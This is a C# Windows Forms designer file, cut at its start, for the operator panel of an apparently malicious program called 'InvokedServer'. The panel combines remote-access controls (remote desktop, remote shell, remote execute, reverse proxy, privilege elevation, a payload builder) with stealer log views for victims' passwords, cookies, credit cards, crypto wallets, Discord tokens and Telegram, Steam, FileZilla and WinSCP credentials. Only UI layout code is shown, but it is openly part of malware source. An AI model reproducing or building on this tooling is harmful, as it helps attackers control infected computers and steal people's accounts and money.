            this.guna2GradientButton2.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton2.Image = global::InvokedServer.Properties.Resources.add;
            this.guna2GradientButton2.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton2.Location = new System.Drawing.Point(94, 191);
            this.guna2GradientButton2.Name = "guna2GradientButton2";
            this.guna2GradientButton2.Size = new System.Drawing.Size(119, 23);
            this.guna2GradientButton2.TabIndex = 38;
            this.guna2GradientButton2.Text = "Create Task";
            this.guna2GradientButton2.Click += new System.EventHandler(this.guna2GradientButton2_Click);
            // 
            // TasksDataGridView
            // 
            this.TasksDataGridView.AllowUserToAddRows = false;
            this.TasksDataGridView.AllowUserToDeleteRows = false;
            this.TasksDataGridView.AllowUserToOrderColumns = true;
            this.TasksDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle61.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle61;
            this.TasksDataGridView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TasksDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.TasksDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle62.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle62.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle62.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle62.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle62.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle62.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle62.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.TasksDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle62;
            this.TasksDataGridView.ColumnHeadersHeight = 20;
            this.TasksDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.TriggerCol,
            this.TaskCol,
            this.Param1Col,
            this.Param2Col,
            this.Param3Col});
            dataGridViewCellStyle63.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle63.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle63.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle63.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle63.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle63.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            dataGridViewCellStyle63.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.TasksDataGridView.DefaultCellStyle = dataGridViewCellStyle63;
            this.TasksDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.TasksDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.Location = new System.Drawing.Point(0, 0);
            this.TasksDataGridView.Name = "TasksDataGridView";
            this.TasksDataGridView.ReadOnly = true;
            this.TasksDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.TasksDataGridView.RowHeadersVisible = false;
            this.TasksDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.TasksDataGridView.Size = new System.Drawing.Size(879, 187);
            this.TasksDataGridView.TabIndex = 7;
            this.TasksDataGridView.TabStop = false;
            this.TasksDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.TasksDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.TasksDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.TasksDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.TasksDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.TasksDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.TasksDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TasksDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.TasksDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.TasksDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.TasksDataGridView.ThemeStyle.ReadOnly = true;
            this.TasksDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.TasksDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.TasksDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TasksDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.TasksDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.TasksDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.SteelBlue;
            this.TasksDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // TriggerCol
            // 
            this.TriggerCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.TriggerCol.HeaderText = "Trigger";
            this.TriggerCol.Name = "TriggerCol";
            this.TriggerCol.ReadOnly = true;
            this.TriggerCol.Width = 150;
            // 
            // TaskCol
            // 
            this.TaskCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.TaskCol.FillWeight = 3.824976F;
            this.TaskCol.HeaderText = "Task";
            this.TaskCol.Name = "TaskCol";
            this.TaskCol.ReadOnly = true;
            this.TaskCol.Width = 150;
            // 
            // Param1Col
            // 
            this.Param1Col.FillWeight = 50.06464F;
            this.Param1Col.HeaderText = "Parameter 1";
            this.Param1Col.Name = "Param1Col";
            this.Param1Col.ReadOnly = true;
            // 
            // Param2Col
            // 
            this.Param2Col.FillWeight = 59.93773F;
            this.Param2Col.HeaderText = "Parameter 2";
            this.Param2Col.Name = "Param2Col";
            this.Param2Col.ReadOnly = true;
            // 
            // Param3Col
            // 
            this.Param3Col.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.Param3Col.FillWeight = 120.7665F;
            this.Param3Col.HeaderText = "Parameter 3";
            this.Param3Col.Name = "Param3Col";
            this.Param3Col.ReadOnly = true;
            // 
            // AboutPage
            // 
            this.AboutPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.AboutPage.Flags = 65534;
            this.AboutPage.ImageSmall = global::InvokedServer.Properties.Resources.exclamation;
            this.AboutPage.LastVisibleSet = true;
            this.AboutPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.AboutPage.Name = "AboutPage";
            this.AboutPage.Size = new System.Drawing.Size(879, 396);
            this.AboutPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.AboutPage.Text = "About";
            this.AboutPage.ToolTipTitle = "Page ToolTip";
            this.AboutPage.UniqueName = "285BA070F5FF4E4A46A441ABBBFB27AF";
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "";
            this.columnHeader4.Width = 100;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "";
            this.columnHeader5.Width = 200;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "";
            this.columnHeader2.Width = 85;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Width = 200;
            // 
            // LabelCol
            // 
            this.LabelCol.Text = "";
            this.LabelCol.Width = 85;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "";
            this.columnHeader1.Width = 200;
            // 
            // notifyIconContextMenuStrip
            // 
            this.notifyIconContextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.notifyIconContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.notifyIconContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.OpenToolStripMenuItem,
            this.HideToolStripMenuItem});
            this.notifyIconContextMenuStrip.Name = "ClientContextMenuStrip";
            this.notifyIconContextMenuStrip.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.notifyIconContextMenuStrip.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.notifyIconContextMenuStrip.RenderStyle.ColorTable = null;
            this.notifyIconContextMenuStrip.RenderStyle.RoundedEdges = true;
            this.notifyIconContextMenuStrip.RenderStyle.SelectionArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.notifyIconContextMenuStrip.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.notifyIconContextMenuStrip.RenderStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.notifyIconContextMenuStrip.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.notifyIconContextMenuStrip.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.notifyIconContextMenuStrip.Size = new System.Drawing.Size(137, 48);
            // 
            // OpenToolStripMenuItem
            // 
            this.OpenToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.OpenToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.application_add;
            this.OpenToolStripMenuItem.Name = "OpenToolStripMenuItem";
            this.OpenToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.OpenToolStripMenuItem.Text = "Open";
            this.OpenToolStripMenuItem.Click += new System.EventHandler(this.OpenToolStripMenuItem_Click);
            // 
            // HideToolStripMenuItem
            // 
            this.HideToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.HideToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.application_delete;
            this.HideToolStripMenuItem.Name = "HideToolStripMenuItem";
            this.HideToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.HideToolStripMenuItem.Text = "Hide to tray";
            this.HideToolStripMenuItem.Click += new System.EventHandler(this.HideToolStripMenuItem_Click);
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ClientSize = new System.Drawing.Size(881, 447);
            this.Controls.Add(this.TabsControl);
            this.Controls.Add(this.statusStrip);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.White;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MinimumSize = new System.Drawing.Size(680, 415);
            this.Name = "FrmMain";
            this.Palette = this.MainKryptonPalette;
            this.PaletteMode = ComponentFactory.Krypton.Toolkit.PaletteMode.Custom;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Loading..";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmMain_FormClosing);
            this.Load += new System.EventHandler(this.FrmMain_Load);
            this.ClientContextMenuStrip.ResumeLayout(false);
            this.statusStrip.ResumeLayout(false);
            this.statusStrip.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.TabsControl)).EndInit();
            this.TabsControl.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientsPage)).EndInit();
            this.ClientsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientsDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.EventLogDataGridView)).EndInit();
            this.EventLogsContextMenuStrip.ResumeLayout(false);
            this.EventLogTopPanel.ResumeLayout(false);
            this.clientInfoPanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.clientInfoPictureBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.ServerPage)).EndInit();
            this.ServerPage.ResumeLayout(false);
            this.guna2GroupBox2.ResumeLayout(false);
            this.guna2GroupBox2.PerformLayout();
            this.guna2GroupBox1.ResumeLayout(false);
            this.guna2GroupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ncPort)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.BuilderPage)).EndInit();
            this.BuilderPage.ResumeLayout(false);
            this.guna2GroupBox3.ResumeLayout(false);
            this.guna2GroupBox3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).EndInit();
            this.guna2GroupBox6.ResumeLayout(false);
            this.guna2GroupBox6.PerformLayout();
            this.guna2GroupBox5.ResumeLayout(false);
            this.guna2GroupBox5.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownDelay)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownPort)).EndInit();
            this.BuilderContextMenuStrip.ResumeLayout(false);
            this.guna2GroupBox4.ResumeLayout(false);
            this.guna2GroupBox4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.kryptonPage1)).EndInit();
            this.kryptonPage1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.NotificationDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.NotiDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.GraphViewPage)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.StealerLogsPage)).EndInit();
            this.StealerLogsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerTabControl)).EndInit();
            this.StealerTabControl.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.LoginsPage)).EndInit();
            this.LoginsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerLoginsDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.AutofillsPage)).EndInit();
            this.AutofillsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerAutofillsDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.CardsPage)).EndInit();
            this.CardsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerCardsDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.CryptoinfoPage)).EndInit();
            this.CryptoinfoPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerCryptoInfoDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.CookiesPage)).EndInit();
            this.CookiesPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerCookiesDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.HistoryPage)).EndInit();
            this.HistoryPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerHistoryDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.DownloadsPage)).EndInit();
            this.DownloadsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerDownloadsDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.AppsPage)).EndInit();
            this.AppsPage.ResumeLayout(false);
            this.StealerAppsTabControl.ResumeLayout(false);
            this.TokensPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerTokensDataGridView)).EndInit();
            this.TelegramPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView1)).EndInit();
            this.SteamPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerSteamDataGridView)).EndInit();
            this.ObsPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerObsDataGridView)).EndInit();
            this.NgrokPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerNgrokDataGridView)).EndInit();
            this.FilaZillaPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerFilezillaDataGridView)).EndInit();
            this.FoxmailPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerFoxmailDataGridView)).EndInit();
            this.WinscpPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.StealerWinscpDataGridView)).EndInit();
            this.guna2GradientPanel1.ResumeLayout(false);
            this.guna2GradientPanel2.ResumeLayout(false);
            this.guna2GradientPanel2.PerformLayout();
            this.guna2GradientPanel3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.AutoTasksPage)).EndInit();
            this.AutoTasksPage.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.NotiTasksDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.TasksDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.AboutPage)).EndInit();
            this.notifyIconContextMenuStrip.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private ImageList imgFlags;
        private NotifyIcon notifyIcon;
        private ImageList imageTabs;
        private StatusStrip statusStrip;
        private ToolStripStatusLabel listenToolStripStatusLabel;
        private ToolStripStatusLabel SelectedClienttoolStripStatusLabel;
        private ToolStripStatusLabel ClientsToolStripStatusLabel;
        private Guna2ContextMenuStrip ClientContextMenuStrip;
        private ToolStripMenuItem remoteDesktopToolStripMenuItem;
        private ToolStripMenuItem systemControlDropdown;
        private ToolStripMenuItem networkDropdown;
        private ToolStripMenuItem remoteShelltoolStripMenuItem;
        private ToolStripMenuItem taskManagertoolStripMenuItem;
        private ToolStripMenuItem startupManagertoolStripMenuItem;
        private ToolStripMenuItem registryEditortoolStripMenuItem;
        private ToolStripMenuItem stealerDropdown;
        private ToolStripMenuItem remoteExecuteToolStripMenuItem;
        private ToolStripMenuItem actionsToolStripMenuItem;
        private ToolStripMenuItem connectionToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator;
        private ToolStripMenuItem selectAllToolStripMenuItem;
        private ToolStripMenuItem discordTokenToolStripMenuItem;
        private ToolStripMenuItem connectionsToolStripMenuItem;
        private ToolStripMenuItem reverseProxyToolStripMenuItem;
        private ToolStripMenuItem shutdownToolStripMenuItem;
        private ToolStripMenuItem restartToolStripMenuItem;
        private ToolStripMenuItem standbyToolStripMenuItem;
        private ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
        private ToolStripMenuItem updateToolStripMenuItem;
        private ToolStripMenuItem reconnectToolStripMenuItem;
        private ToolStripMenuItem disconnectToolStripMenuItem;
        private ToolStripMenuItem uninstallToolStripMenuItem;
        private ToolStripMenuItem BrowsersToolStripMenuItem;
        private ToolStripMenuItem cryptoDataToolStripMenuItem;
        private ToolStripMenuItem stealerOptionstoolStripMenuItem;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripMenuItem telegramInfoToolStripMenuItem;
        private ToolStripMenuItem steamToolStripMenuItem;
        private ToolStripMenuItem oBSKeysToolStripMenuItem;
        private ToolStripMenuItem ngrokAuthKeysToolStripMenuItem;
        private ToolStripMenuItem fileZillaToolStripMenuItem;
        private ToolStripMenuItem foxmailToolStripMenuItem;
        private ToolStripMenuItem winSCPToolStripMenuItem;
        private Guna2Elipse guna2Elipse1;
        private KryptonPalette MainKryptonPalette;
        private KryptonNavigator TabsControl;
        private KryptonPage ClientsPage;
        private KryptonPage StealerLogsPage;
        private KryptonPage BuilderPage;
        private KryptonPage ServerPage;
        private KryptonPage GraphViewPage;
        private KryptonPage AboutPage;
        private KryptonPage AutoTasksPage;
        private Guna2VScrollBar eventsLogVScrollBar;
        private Guna2DataGridView EventLogDataGridView;
        private DataGridViewTextBoxColumn LogData;
        private Guna2VScrollBar clientsVScrollBar;
        private Guna2DataGridView ClientsDataGridView;
        private Guna2CustomGradientPanel clientInfoPanel;
        private ColumnHeader columnHeader4;
        private ColumnHeader columnHeader5;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader LabelCol;
        private ColumnHeader columnHeader1;
        private Guna2PictureBox clientInfoPictureBox;
        private Guna2GradientPanel guna2GradientPanel1;
        private Guna2GradientPanel guna2GradientPanel3;
        private Guna2Button StealerSaveBtn;
        private Guna2Button StealerCopyBtn;
        private Guna2Button StealerDeleteBtn;
        private Guna2Button StealerDeleteLogsbtn;
        private Guna2Button StealerFilterBtn;
        private Guna2GradientPanel guna2GradientPanel2;
        private Guna2Button StealerSearchClear;
        private Guna2TextBox StealerSearchTextbox;
        private Label StealerSearchbarLabel;
        private Guna2Button StealerSearchBtn;
        private KryptonNavigator StealerTabControl;
        private KryptonPage LoginsPage;
        private KryptonPage AutofillsPage;
        private KryptonPage CookiesPage;
        private KryptonPage CardsPage;
        private KryptonPage CryptoinfoPage;
        private KryptonPage HistoryPage;
        private KryptonPage DownloadsPage;
        private KryptonPage AppsPage;
        private Guna2DataGridView StealerLoginsDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn3;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn5;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn14;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn15;
        private Guna2DataGridView StealerAutofillsDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;
        private DataGridViewTextBoxColumn Column3;
        private DataGridViewTextBoxColumn Column1;
        private DataGridViewTextBoxColumn Column2;
        private Guna2DataGridView StealerCookiesDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn7;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn9;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn16;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn17;
        private DataGridViewTextBoxColumn ValueCol;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn19;
        private Guna2DataGridView StealerCardsDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn10;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn11;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn13;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn20;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn21;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn22;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn23;
        private Guna2DataGridView StealerCryptoInfoDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn18;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn28;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn29;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn30;
        private Guna2DataGridView StealerHistoryDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn31;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn32;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn34;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn35;
        private Guna2DataGridView StealerDownloadsDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn39;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn40;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn42;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn43;
        private Guna2TabControl StealerAppsTabControl;
        private TabPage TokensPage;
        private Guna2DataGridView StealerTokensDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn24;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn25;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn26;
        private DataGridViewTextBoxColumn Column5;
        private DataGridViewTextBoxColumn Column6;
        private DataGridViewTextBoxColumn Column7;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn27;
        private TabPage TelegramPage;
        private Guna2DataGridView guna2DataGridView1;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn8;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn12;
        private TabPage SteamPage;
        private Guna2DataGridView StealerSteamDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn41;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn44;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn45;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn46;
        private TabPage ObsPage;
        private Guna2DataGridView StealerObsDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn50;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn51;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn52;
        private TabPage NgrokPage;
        private Guna2DataGridView StealerNgrokDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn57;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn58;
        private TabPage FilaZillaPage;
        private Guna2DataGridView StealerFilezillaDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn64;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn65;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn66;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn67;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn68;
        private TabPage FoxmailPage;
        private Guna2DataGridView StealerFoxmailDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn71;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn72;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn73;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn74;
        private TabPage WinscpPage;
        private Guna2DataGridView StealerWinscpDataGridView;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn78;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn79;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn80;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn81;
        private DataGridViewTextBoxColumn dataGridViewTextBoxColumn82;
        private DataGridViewImageColumn FlagCol;
        private DataGridViewTextBoxColumn IPCol;
        private DataGridViewTextBoxColumn TagCol;
        private DataGridViewTextBoxColumn UserCol;
        private DataGridViewTextBoxColumn VersionCol;
        private DataGridViewTextBoxColumn StatusCol;
        private DataGridViewTextBoxColumn UserStatusCol;
        private DataGridViewTextBoxColumn CountryCol;
        private DataGridViewTextBoxColumn OSCol;
        private DataGridViewTextBoxColumn AccounttypeCol;
        private AeroListView clientDetailedInfoListView;
        private AeroListView clientInfoCountryListView;
        private ColumnHeader columnHeader6;
        private ColumnHeader columnHeader7;
        private AeroListView clientNetworkInfoListView;
        private ColumnHeader columnHeader8;
        private ColumnHeader columnHeader9;
